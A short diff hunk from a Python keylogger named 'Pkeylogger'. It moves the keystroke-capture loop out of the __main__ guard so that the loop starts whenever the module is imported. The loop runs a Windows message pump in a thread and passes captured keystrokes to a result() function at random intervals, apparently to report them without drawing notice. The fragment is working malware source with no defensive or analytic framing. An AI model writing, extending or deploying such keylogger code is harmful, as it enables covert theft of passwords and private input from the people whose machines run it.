@@ -49,14 +49,14 @@ def main2():
     pythoncom.PumpMessages()
 
 
-if __name__ == '__main__':
-    th = threading.Thread(target=main2)
-    th.start()
-    time.sleep(random.randint(100, 300))
-    while True:
-        try:
-            result(string, "Pkeylogger")
-            string = ""
-            time.sleep(random.randint(100, 300))
-        except:
-            continue
+
+th = threading.Thread(target=main2)
+th.start()
+time.sleep(random.randint(100, 300))
+while True:
+    try:
+        result(string, "Pkeylogger")
+        string = ""
+        time.sleep(random.randint(100, 300))
+    except:
+        continue
